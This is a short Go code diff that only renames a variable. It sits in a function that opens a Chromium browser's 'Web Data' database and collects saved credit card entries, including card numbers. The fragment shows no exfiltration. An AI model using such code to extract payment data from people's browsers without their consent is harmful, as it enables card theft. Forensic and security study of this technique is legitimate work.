@@ -6,7 +6,7 @@ import (
 	_ "modernc.org/sqlite"
 )
 
-func (c *Chromium) GetCreditCards(path string) (creditcards []CreditCard, err error) {
+func (c *Chromium) GetCreditCards(path string) (creditCards []CreditCard, err error) {
 	db, err := GetDBConnection(filepath.Join(path, "Web Data"))
 	if err != nil {
 		return nil, err
@@ -45,8 +45,8 @@ func (c *Chromium) GetCreditCards(path string) (creditcards []CreditCard, err er
 		}
 
 		creditCard.Number = string(value)
-		creditcards = append(creditcards, creditCard)
+		creditCards = append(creditCards, creditCard)
 	}
 
-	return creditcards, nil
+	return creditCards, nil
 }
